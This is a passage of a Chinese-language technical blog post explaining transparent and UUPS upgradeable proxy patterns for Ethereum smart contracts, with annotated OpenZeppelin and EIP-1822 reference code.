+<li><a target="_blank" rel="noopener" href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#ERC1967Upgrade"><code>ERC1967Upgrade</code></a>：用于获取和设置 EIP1967 中定义的存储插槽的内部函数。</li>
+<li><a target="_blank" rel="noopener" href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#ERC1967Proxy"><code>ERC1967Proxy</code></a>：使用 EIP1967 存储插槽的代理。默认情况下不可升级。</li>
+</ul>
+<p>有两种替代方法可以向 ERC1967 代理添加可升级性。它们的差异在下面透明与 UUPS 代理中进行了解释。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#TransparentUpgradeableProxy"><code>TransparentUpgradeableProxy</code></a>：具有内置管理和升级界面的代理。</li>
+<li><a target="_blank" rel="noopener" href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#UUPSUpgradeable"><code>UUPSUpgradeable</code></a>：一种包含在实施合同中的可升级性机制。</li>
+</ul>
+<h4 id="透明代理模式"><a href="#透明代理模式" class="headerlink" title="透明代理模式"></a>透明代理模式</h4><p><a target="_blank" rel="noopener" href="https://blog.openzeppelin.com/the-transparent-proxy-pattern/">透明代理模式 - OpenZeppelin 博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/proxy/transparent">transparent示例代码</a></p>
+<p>目的：为了解决函数冲突问题</p>
+<p>透明代理，有三方参与：代理合约、逻辑合约和管理合约。</p>
+<p><img src="/2022/11/13/upgradeable/image-20221104173019245.png" srcset="/img/loading.gif" lazyload alt="image-20221104173019245"></p>
+<p>我们处理此问题的方法是通过透明代理模式。透明代理的目标是用户无法与实际逻辑协定区分开来。这意味着调用代理的用户应始终最终执行逻辑协定中的函数，而不是代理管理函数。<code>upgradeTo</code></p>
+<p>那么，我们如何允许代理管理呢？答案基于<em>邮件发件人</em>。透明代理将根据调用方地址决定将哪些调用委托给底层逻辑协定：</p>
+<ul>
+<li>如果调用方是代理的管理员，则代理<strong>不会</strong> delegate any calls，而只会应答它理解的管理消息。</li>
+<li>如果调用方是任何其他地址，则代理将<strong>始终</strong> delegate the calls，无论它是否与代理自己的功能之一匹配。</li>
+</ul>
+<p>让我们在示例中看看它是如何工作的。假设一个带有 angetter 和 anfunction 的代理，该代理将调用委托给具有 angetter 和 afunction 的 ERC20 合约。下表涵盖了所有生成的方案：<code>owner()</code> <code>upgradeTo()</code> <code>owner()</code> <code>transfer()</code></p>
+<p><img src="/2022/11/13/upgradeable/image-20221104171454827.png" srcset="/img/loading.gif" lazyload alt="image-20221104171454827"></p>
+<p>这些属性意味着<strong>管理员帐户只能用于管理员操作</strong>，例如升级代理或更改 管理员，因此最好是不用于其他任何用途的专用帐户。这将避免头痛 尝试从代理实现调用函数时突然出错。</p>
+<p>虽然这是最安全的方法，但它可能会导致令人困惑的情况。例如，如果用户创建逻辑协定的代理，然后立即尝试与之交互（按照上面的示例，通过调用），他们将收到还原错误。这是因为来自代理管理员的任何调用都不会委托给逻辑协定。<code>transfer()</code></p>
+<h5 id="TransparentUpgradeableProxy"><a href="#TransparentUpgradeableProxy" class="headerlink" title="TransparentUpgradeableProxy"></a>TransparentUpgradeableProxy</h5><p>该合约实现了一个由管理员升级的代理。</p>
+<ol>
+<li>如果管理员以外的任何帐户调用代理，则调用将转发到实现，即使 该调用与代理本身公开的管理函数之一匹配。</li>
+<li>如果管理员调用代理，它可以访问管理功能，但其调用永远不会转发到 实现。如果管理员尝试在实现上调用函数，它将失败并显示错误 “管理员无法回退到代理目标”。</li>
+</ol>
+<p>这些属性意味着管理员帐户只能用于管理员操作，例如升级代理或更改 管理员，因此最好是不用于其他任何用途的专用帐户。这将避免头痛 尝试从代理实现调用函数时突然出错。</p>
+<p>我们建议将专用帐户作为<a target="_blank" rel="noopener" href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#ProxyAdmin"><code>代理管理员</code></a>合同的实例。如果以这种方式设置， 您应该将实例视为代理的真正管理界面。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// OpenZeppelin Contracts (last updated v4.7.0) (proxy/transparent/TransparentUpgradeableProxy.sol)<br><br>pragma solidity ^0.8.0;<br><br>import &quot;../ERC1967/ERC1967Proxy.sol&quot;;<br><br>/**<br> * @dev This contract implements a proxy that is upgradeable by an admin.<br> *<br> * To avoid https://medium.com/nomic-labs-blog/malicious-backdoors-in-ethereum-proxies-62629adf3357[proxy selector<br> * clashing], which can potentially be used in an attack, this contract uses the<br> * https://blog.openzeppelin.com/the-transparent-proxy-pattern/[transparent proxy pattern]. This pattern implies two<br> * things that go hand in hand:<br> *<br> * 1. If any account other than the admin calls the proxy, the call will be forwarded to the implementation, even if<br> * that call matches one of the admin functions exposed by the proxy itself.<br> * 2. If the admin calls the proxy, it can access the admin functions, but its calls will never be forwarded to the<br> * implementation. If the admin tries to call a function on the implementation it will fail with an error that says<br> * &quot;admin cannot fallback to proxy target&quot;.<br> *<br> * These properties mean that the admin account can only be used for admin actions like upgrading the proxy or changing<br> * the admin, so it&#x27;s best if it&#x27;s a dedicated account that is not used for anything else. This will avoid headaches due<br> * to sudden errors when trying to call a function from the proxy implementation.<br> *<br> * Our recommendation is for the dedicated account to be an instance of the &#123;ProxyAdmin&#125; contract. If set up this way,<br> * you should think of the `ProxyAdmin` instance as the real administrative interface of your proxy.<br> */<br>contract TransparentUpgradeableProxy is ERC1967Proxy &#123;<br>    /**<br>     * @dev Initializes an upgradeable proxy managed by `_admin`, backed by the implementation at `_logic`, and<br>     * optionally initialized with `_data` as explained in &#123;ERC1967Proxy-constructor&#125;.<br>     */<br>    //  初始化由 `_admin` 管理的可升级代理，由 `_logic` 作为逻辑合约，以及如 &#123;ERC1967Proxy-constructor&#125; 中所述，可选择使用 `_data` 进行初始化。<br>    constructor(<br>        address _logic,<br>        address admin_,<br>        bytes memory _data<br>    ) payable ERC1967Proxy(_logic, _data) &#123;<br>        _changeAdmin(admin_);<br>    &#125;<br><br>    /**<br>     * @dev Modifier used internally that will delegate the call to the implementation unless the sender is the admin.<br>     */<br>    //  如果不是管理员，则会使用 delegatecall 来调用逻辑合约<br>    modifier ifAdmin() &#123;<br>        if (msg.sender == _getAdmin()) &#123;<br>            _;<br>        &#125; else &#123;<br>            _fallback();<br>        &#125;<br>    &#125;<br><br>    /**<br>     * @dev Returns the current admin.<br>     *<br>     * NOTE: Only the admin can call this function. See &#123;ProxyAdmin-getProxyAdmin&#125;.<br>     *<br>     * TIP: To get this value clients can read directly from the storage slot shown below (specified by EIP1967) using the<br>     * https://eth.wiki/json-rpc/API#eth_getstorageat[`eth_getStorageAt`] RPC call.<br>     * `0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103`<br>     */<br>    // 只有管理员能调用这个函数 <br>    function admin() external ifAdmin returns (address admin_) &#123;<br>        admin_ = _getAdmin();<br>    &#125;<br><br>    /**<br>     * @dev Returns the current implementation.<br>     *<br>     * NOTE: Only the admin can call this function. See &#123;ProxyAdmin-getProxyImplementation&#125;.<br>     *<br>     * TIP: To get this value clients can read directly from the storage slot shown below (specified by EIP1967) using the<br>     * https://eth.wiki/json-rpc/API#eth_getstorageat[`eth_getStorageAt`] RPC call.<br>     * `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`<br>     */<br>    //  返回当前的逻辑合约<br>    function implementation() external ifAdmin returns (address implementation_) &#123;<br>        implementation_ = _implementation();<br>    &#125;<br><br>    /**<br>     * @dev Changes the admin of the proxy.<br>     *<br>     * Emits an &#123;AdminChanged&#125; event.<br>     *<br>     * NOTE: Only the admin can call this function. See &#123;ProxyAdmin-changeProxyAdmin&#125;.<br>     */<br>    function changeAdmin(address newAdmin) external virtual ifAdmin &#123;<br>        _changeAdmin(newAdmin);<br>    &#125;<br><br>    /**<br>     * @dev Upgrade the implementation of the proxy.<br>     *<br>     * NOTE: Only the admin can call this function. See &#123;ProxyAdmin-upgrade&#125;.<br>     */<br>    // 升级逻辑合约 <br>    function upgradeTo(address newImplementation) external ifAdmin &#123;<br>        _upgradeToAndCall(newImplementation, bytes(&quot;&quot;), false);<br>    &#125;<br><br>    /**<br>     * @dev Upgrade the implementation of the proxy, and then call a function from the new implementation as specified<br>     * by `data`, which should be an encoded function call. This is useful to initialize new storage variables in the<br>     * proxied contract.<br>     *<br>     * NOTE: Only the admin can call this function. See &#123;ProxyAdmin-upgradeAndCall&#125;.<br>     */<br>    // 升级逻辑合约，并额外使用 delegatecall 调用 data<br>    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable ifAdmin &#123;<br>        _upgradeToAndCall(newImplementation, data, true);<br>    &#125;<br><br>    /**<br>     * @dev Returns the current admin.<br>     */<br>    // 返回现在的管理员 <br>    function _admin() internal view virtual returns (address) &#123;<br>        return _getAdmin();<br>    &#125;<br><br>    /**<br>     * @dev Makes sure the admin cannot access the fallback function. See &#123;Proxy-_beforeFallback&#125;.<br>     */<br>    // 确保管理员无法访问 Fallback 函数<br>    function _beforeFallback() internal virtual override &#123;<br>        require(msg.sender != _getAdmin(), &quot;TransparentUpgradeableProxy: admin cannot fallback to proxy target&quot;);<br>        super._beforeFallback();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h5 id="ProxyAdmin"><a href="#ProxyAdmin" class="headerlink" title="ProxyAdmin"></a>ProxyAdmin</h5><p>这是一个辅助合同，旨在被分配为<a target="_blank" rel="noopener" href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#TransparentUpgradeableProxy"><code>TransparentUpgradeableProxy</code></a> 的管理员。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// OpenZeppelin Contracts v4.4.1 (proxy/transparent/ProxyAdmin.sol)<br><br>pragma solidity ^0.8.0;<br><br>import &quot;./TransparentUpgradeableProxy.sol&quot;;<br>import &quot;../../access/Ownable.sol&quot;;<br><br>/**<br> * @dev This is an auxiliary contract meant to be assigned as the admin of a &#123;TransparentUpgradeableProxy&#125;. For an<br> * explanation of why you would want to use this see the documentation for &#123;TransparentUpgradeableProxy&#125;.<br> */<br>contract ProxyAdmin is Ownable &#123;<br>    /**<br>     * @dev Returns the current implementation of `proxy`.<br>     *<br>     * Requirements:<br>     *<br>     * - This contract must be the admin of `proxy`.<br>     */<br>    // 返回代理合约的逻辑合约，并要求此合约必须是代理合约的管理员 <br>    function getProxyImplementation(TransparentUpgradeableProxy proxy) public view virtual returns (address) &#123;<br>        // We need to manually run the static call since the getter cannot be flagged as view<br>        // bytes4(keccak256(&quot;implementation()&quot;)) == 0x5c60da1b<br>        (bool success, bytes memory returndata) = address(proxy).staticcall(hex&quot;5c60da1b&quot;);<br>        require(success);<br>        return abi.decode(returndata, (address));<br>    &#125;<br><br>    /**<br>     * @dev Returns the current admin of `proxy`.<br>     *<br>     * Requirements:<br>     *<br>     * - This contract must be the admin of `proxy`.<br>     */<br>    // 返回代理合约的管理员，并要求此合约必须是代理合约的管理员 <br>    function getProxyAdmin(TransparentUpgradeableProxy proxy) public view virtual returns (address) &#123;<br>        // We need to manually run the static call since the getter cannot be flagged as view<br>        // bytes4(keccak256(&quot;admin()&quot;)) == 0xf851a440<br>        (bool success, bytes memory returndata) = address(proxy).staticcall(hex&quot;f851a440&quot;);<br>        require(success);<br>        return abi.decode(returndata, (address));<br>    &#125;<br><br>    /**<br>     * @dev Changes the admin of `proxy` to `newAdmin`.<br>     *<br>     * Requirements:<br>     *<br>     * - This contract must be the current admin of `proxy`.<br>     */<br>    // 更改代理合约的管理员，并要求此合约必须是代理合约的管理员<br>    function changeProxyAdmin(TransparentUpgradeableProxy proxy, address newAdmin) public virtual onlyOwner &#123;<br>        proxy.changeAdmin(newAdmin);<br>    &#125;<br><br>    /**<br>     * @dev Upgrades `proxy` to `implementation`. See &#123;TransparentUpgradeableProxy-upgradeTo&#125;.<br>     *<br>     * Requirements:<br>     *<br>     * - This contract must be the admin of `proxy`.<br>     */<br>    // 升级，并要求此合约必须是代理合约的管理员  <br>    function upgrade(TransparentUpgradeableProxy proxy, address implementation) public virtual onlyOwner &#123;<br>        proxy.upgradeTo(implementation);<br>    &#125;<br><br>    /**<br>     * @dev Upgrades `proxy` to `implementation` and calls a function on the new implementation. See<br>     * &#123;TransparentUpgradeableProxy-upgradeToAndCall&#125;.<br>     *<br>     * Requirements:<br>     *<br>     * - This contract must be the admin of `proxy`.<br>     */<br>    // 升级，额外使用 delegatecall 调用 data，并要求此合约必须是代理合约的管理员 <br>    function upgradeAndCall(<br>        TransparentUpgradeableProxy proxy,<br>        address implementation,<br>        bytes memory data<br>    ) public payable virtual onlyOwner &#123;<br>        proxy.upgradeToAndCall&#123;value: msg.value&#125;(implementation, data);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<h5 id="逻辑合约"><a href="#逻辑合约" class="headerlink" title="逻辑合约"></a>逻辑合约</h5><p>就算逻辑合约里有<code>upgradeTo</code>等方法，也不会影响调用。因为普通用户就直接在代理合约判断<code>ifAdmin</code>的时候就转到了逻辑合约里，而管理合约的调用，就会放行到代理合约直接执行。</p>
+<h5 id="管理合约"><a href="#管理合约" class="headerlink" title="管理合约"></a>管理合约</h5><p>仅仅是回调参数传过来的proxy的同名函数。整个管理合约是否可以调用proxy的函数，是在proxy代理合约里判断的。所以管理合约很轻量。</p>
+<h5 id="合约升级"><a href="#合约升级" class="headerlink" title="合约升级"></a>合约升级</h5><p>用代理合约地址，直接调用管理合约的<code>upgrade</code>或者<code>upgradeAndCall</code>方法即可。</p>
+<h4 id="UUPS"><a href="#UUPS" class="headerlink" title="UUPS"></a>UUPS</h4><p>也就是 EIP1822</p>
+<h5 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h5><p>EIP-1822讨论的合约升级模式与Openzeppelin的透明合约升级模式的不同点在于：EIP-1822的代理合约只读取实现合约的地址，并将所有的方法都代理给实现合约，包括修改实现合约地址的逻辑部分也在实现合约里。而透明合约升级模式中，proxy合约管理着实现合约的地址，要实现合约升级，只需要在proxy合约中更改实现合约的地址即可。其他的逻辑代理给实现合约。</p>
+<p>也就是说EIP-1822的实现合约既包含了普通的业务逻辑处理，更包含了自身的升级逻辑处理。简单来讲就是EIP-1822的实现合约部分，都需要继承自一个公共的可升级实现合约：proxiable.sol。在可升级的实现合约proxiable中，实现如下方法：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">proxiableUUID</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params">bytes32</span>) </span>&#123;<br>	<span class="hljs-comment">//作用是一个flag，用来判断是否返回特定值keccak256(&quot;PROXIABLE&quot;)，以判断该合约是否是一个实现了EIP-1822的可升级实现合约</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">updateCodeAddress</span>(<span class="hljs-params">address newAddress</span>) <span class="hljs-title">ineternal</span> </span>&#123;<br>	<span class="hljs-comment">//简单来讲就是更新实际逻辑实现合约的地址</span><br>	<span class="hljs-built_in">require</span>(<span class="hljs-built_in">this</span>.proxiableUUID() == Proxiable(newAddress).proxiableUUID());<br>	bytes32 proxiableUUID_ = <span class="hljs-built_in">this</span>.proxiableUUID();<br>	assembly&#123;<br>	 sstore(proxiableUUID_, newAddress)<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后在实现合约中，所有的实现合约都继承自proxiable合约，然后实现自己的逻辑即可。因为代理合约只是从插槽<code>keccak256(&quot;PROXIABLE&quot;)</code>处读取实现合约的地址，而实现合约可以通过proxiable中的updateCodeAddress方法来更新这个地址，从而实现代理合约中对应插槽<code>keccak256(&quot;PROXIABLE&quot;)</code>位置处的地址改变为目标地址。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/proxy/utils">UUPS 代码</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-1822.md">EIP1822 官方文档</a></p>
+<p><a target="_blank" rel="noopener" href="https://ethereum-magicians.org/t/eip-1822-universal-upgradeable-proxy-standard-uups/2842">EIP1822 讨论</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.logrocket.com/using-uups-proxy-pattern-upgrade-smart-contracts/">UUPS + hardhat</a></p>
+<p><img src="/2022/11/13/upgradeable/image-20221104172156181.png" srcset="/img/loading.gif" lazyload alt="image-20221104172156181"></p>
+<p>UUPS 代理模式类似于透明代理模式</p>
+<p>用户和代理合约交互，代理合约不直接实现<code>upgradeTo</code>和<code>upgradeToAndCall</code>，由逻辑合约实现。</p>
+<p>EIP-1822 使用 <code>keccak256(&quot;PROXIABLE&quot;) = &quot;0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7&quot;</code> 存储槽中的结果。它不是 100% 随机的，但足够随机，因此不会发生碰撞。至少在正常情况下。您可以深入<a target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/v0.8.2/internals/layout_in_storage.html#layout-of-state-variables-in-storage">研究 Solidity 中的存储变量布局，</a>然后您会发现几乎没有机会产生碰撞。</p>
+<p>OpenZeppelin 建议使用 UUPS 模式，因为它更省气。但是何时使用 UUPS 的决定实际上是基于几个因素，例如项目的业务需求等等。</p>
+<p>UUPS 最初的动机是在主网上部署许多智能合约钱包。逻辑可以部署一次。代理可以为每个新钱包部署数百次，而无需花费太多 gas。</p>
+<p>由于升级方法存在于逻辑合约中，如果协议未来想要完全去除可升级性，开发者可以选择 UUPS。</p>
+<h5 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h5><p>接口合约</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// OpenZeppelin Contracts (last updated v4.5.0) (interfaces/draft-IERC1822.sol)<br><br>pragma solidity ^0.8.0;<br><br>/**<br> * @dev ERC1822: Universal Upgradeable Proxy Standard (UUPS) documents a method for upgradeability through a simplified<br> * proxy whose upgrades are fully controlled by the current implementation.<br> */<br>interface IERC1822Proxiable &#123;<br>    /**<br>     * @dev Returns the storage slot that the proxiable contract assumes is being used to store the implementation<br>     * address.<br>     *<br>     * IMPORTANT: A proxy pointing at a proxiable contract should not be considered proxiable itself, because this risks<br>     * bricking a proxy that upgrades to it, by delegating to itself until out of gas. Thus it is critical that this<br>     * function revert if invoked through a proxy.<br>     */<br>    // 返回可代理合约假定用于存储实现地址的存储槽。<br>    // 指向可代理合约的代理本身不应该被认为是可代理的，因为这可能会通过委托给自己直到耗尽gas而破坏升级到它的代理。 因此，如果通过代理调用此函数，则该函数revert至关重要。 <br>    function proxiableUUID() external view returns (bytes32);<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>代理合约</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.5.1;<br><br>contract Proxy &#123;<br>    // Code position in storage is keccak256(&quot;PROXIABLE&quot;) = &quot;0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7&quot;<br>    // 提议的构造函数接受任意数量的任何类型的参数，因此与任何逻辑合约构造函数兼容。<br>    // 此外，代理合约构造函数的任意性质提供了从逻辑合约源代码中可用的一个或多个构造函数中进行选择的能力（例如constructor1，constructor2...等）。请注意，如果逻辑契约中包含多个构造函数，则应包含一个检查以禁止在初始化后再次调用构造函数。<br>    // 值得注意的是，支持多个构造函数的新增功能不会抑制对 Proxy Contract 字节码的验证，因为初始化 tx 调用数据（输入）可以先使用 Proxy Contract ABI，然后使用 Logic Contract ABI 进行解码。<br>    constructor(bytes memory constructData, address contractLogic) public &#123;<br>        // save the code address<br>        assembly &#123; // solium-disable-line<br>            sstore(0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7, contractLogic)<br>        &#125;<br>        (bool success, bytes memory _ ) = contractLogic.delegatecall(constructData); // solium-disable-line<br>        require(success, &quot;Construction failed&quot;);<br>    &#125;<br><br>    // 将逻辑合约的地址存储在定义的存储位置keccak256(&quot;PROXIABLE&quot;)。这消除了代理和逻辑合约中的变量之间发生冲突的可能性，从而提供了与任何逻辑合约的“通用”兼容性。<br>    function() external payable &#123;<br>        assembly &#123; // solium-disable-line<br>            let contractLogic := sload(0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7)<br>            calldatacopy(0x0, 0x0, calldatasize)<br>            let success := delegatecall(sub(gas, 10000), contractLogic, 0x0, calldatasize, 0, 0)<br>            let retSz := returndatasize<br>            returndatacopy(0, 0, retSz)<br>            switch success<br>            case 0 &#123;<br>                revert(0, retSz)<br>            &#125;<br>            default &#123;<br>                return(0, retSz)<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>逻辑合约</p>
+<p>Proxiable Contract 包含在 Logic Contract 中，并提供执行升级所需的功能。兼容性检查<code>proxiable</code>可防止升级期间出现无法修复的更新。</p>
+<p>警告：<code>updateCodeAddress</code>并且<code>proxiable</code>必须存在于逻辑合约中。未能包含这些可能会阻止升级，并可能使代理合约变得完全无法使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Proxiable &#123;<br>    // Code position in storage is keccak256(&quot;PROXIABLE&quot;) = &quot;0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7&quot;<br><br>    // 兼容性检查以确保新的逻辑合约实现通用可升级代理标准。请注意，为了支持未来的实现，bytes32可以更改比较，例如keccak256(&quot;PROXIABLE-ERC1822-v1&quot;).<br>    function updateCodeAddress(address newAddress) internal &#123;<br>        require(<br>            bytes32(0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7) == Proxiable(newAddress).proxiableUUID(),<br>            &quot;Not compatible&quot;<br>        );<br>        assembly &#123; // solium-disable-line<br>            sstore(0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7, newAddress)<br>        &#125;<br>    &#125;<br>    // 将逻辑合约的地址存储keccak256(&quot;PROXIABLE&quot;)在代理合约中。<br>    function proxiableUUID() public pure returns (bytes32) &#123;<br>        return 0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
